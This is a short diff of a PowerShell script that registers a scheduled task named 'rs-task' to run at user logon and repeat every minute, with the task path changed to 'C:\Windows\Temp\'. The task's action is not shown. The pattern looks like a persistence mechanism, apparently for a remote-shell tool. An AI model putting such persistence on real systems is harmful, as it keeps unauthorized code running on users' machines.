@@ -16,10 +16,10 @@ if($taskExists) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn;
    $principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName);
    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
-   Register-ScheduledTask rs-task -InputObject $task;
+   Register-ScheduledTask rs-task -InputObject $task -TaskPath "C:\Windows\Temp\";
    $post_task = Get-ScheduledTask -TaskName "rs-task";
    $post_task.Triggers.repetition.Interval = 'PT1M'
-   $post_task | Set-ScheduledTask -TaskPath "C:\Windows\Temp\"
+   $post_task | Set-ScheduledTask
    #$post_trigger.Triggers.Repetition.Interval = "PT1M";
    #$post_trigger Set-ScheduledTask -TaskPath "C:\Windows\Temp\");
    #Start-ScheduledTask -TaskName rs-task;
